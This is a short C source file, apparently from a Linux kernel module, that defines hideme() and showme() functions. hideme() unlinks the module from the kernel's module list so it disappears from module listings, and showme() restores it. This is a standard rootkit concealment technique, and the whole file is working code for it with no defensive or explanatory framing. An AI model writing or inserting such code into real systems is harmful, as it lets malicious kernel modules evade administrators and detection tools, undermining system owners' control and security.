#include "hideme.h"

static short hidden = 0;

static struct list_head *prev_module;

void hideme(char *content)
{
	if (!hidden) {
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
		hidden = 1;
	}
}

void showme(char *content)
{
	if (hidden) {
		list_add(&THIS_MODULE->list, prev_module);
		hidden = 0;
	}
}
